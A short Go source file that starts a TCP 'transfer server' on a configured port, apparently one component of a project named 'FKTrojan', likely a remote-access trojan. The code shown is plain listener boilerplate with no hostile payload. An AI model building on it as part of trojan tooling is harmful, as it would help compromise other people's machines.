package service_transfer

import (
	"FKTrojan/config"
	"FKTrojan/connect"
)

var (
	server *connect.TcpServer
)

func init() {

}

func ListenAndServe() error {
	server = connect.NewTcpServer(connect.TRANSFER_SERVER, config.Conf.TransPort, ServerHandler)
	return server.Run()
}
